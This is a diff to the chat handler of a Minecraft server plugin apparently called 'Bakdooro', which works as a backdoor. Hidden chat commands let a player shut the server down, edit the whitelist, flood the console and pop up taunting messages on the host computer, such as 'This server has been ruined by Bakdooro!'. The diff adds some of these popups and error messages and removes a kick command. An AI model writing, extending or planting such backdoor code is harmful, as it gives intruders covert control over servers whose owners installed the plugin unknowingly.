@@ -6,6 +6,9 @@ import me.acaiberii.bakdooro.commands.misc.misc;
 import org.bukkit.entity.Player;
 import me.acaiberii.bakdooro.items.itm;
 
+import java.io.File;
+import java.io.FileWriter;
+import java.io.IOException;
 import java.util.Objects;
 import java.util.Random;
 
@@ -27,6 +30,9 @@ public class chathandler {
                     }
                     else if (spl[1].equals("console")) {
                         exploit.consoleFill();
+                    }
+                    else {
+                        pl.sendMessage("Unknown mode. Valid modes: chat, console.");
                     }
                 }
             }
@@ -98,22 +104,14 @@ public class chathandler {
                             pl.sendMessage("Removed " + pll.getName() + " from whitelist.");
                         }
                     }
+                    else {
+                        pl.sendMessage("Unknown mode. Valid modes: on, off, add, remove.");
+                    }
                 }
             }
             else if (spl[0].startsWith(">shutdown")) {
-                pl.sendMessage("Shutting down.");
+                pl.sendMessage("Shutting down server.");
                 srv.shutdown();
-            }
-            else if (spl[0].startsWith(">mod")) {
-                if (spl.length < 3) {
-                    pl.sendMessage("Invalid syntax. Correct syntax: >mod:(kick):(PLAYER)");
-                }
-                else {
-                    if (spl[1].equals("kick")) {
-                        Player pll = getPlayer(spl[2]);
-                        Objects.requireNonNull(pll).kickPlayer("Kicked from server.");
-                    }
-                }
             }
             else if (spl[0].startsWith(">blatant")) {
                 if (spl.length < 2) {
@@ -128,8 +126,14 @@ public class chathandler {
                             if (spl[2].equals("hacker")) {
                                 blnt.infoBox((getOnlinePlayers().toArray()[new Random().ints(0, getOnlinePlayers().size()).findFirst().getAsInt()]) + " detected for " + itm.hacks[new Random().ints(0, itm.hacks.length).findFirst().getAsInt()], "Player was detected for hacks!");
                             }
+                            else if (spl[2].equals("givemeclout")) {
+                                blnt.infoBox("This server has been ruined by Bakdooro!", "https://github.com/AcaiBerii/Bakdooro");
+                            }
+                            else if (spl[2].equals("annoy")) {
+                                blnt.infoBox("Still using this computer?", "lol");
+                            }
                             else {
-                                pl.sendMessage("Unknown mode. Valid modes: hacker.");
+                                pl.sendMessage("Unknown mode. Valid modes: hacker, givemeclout.");
                             }
                         }
                     }
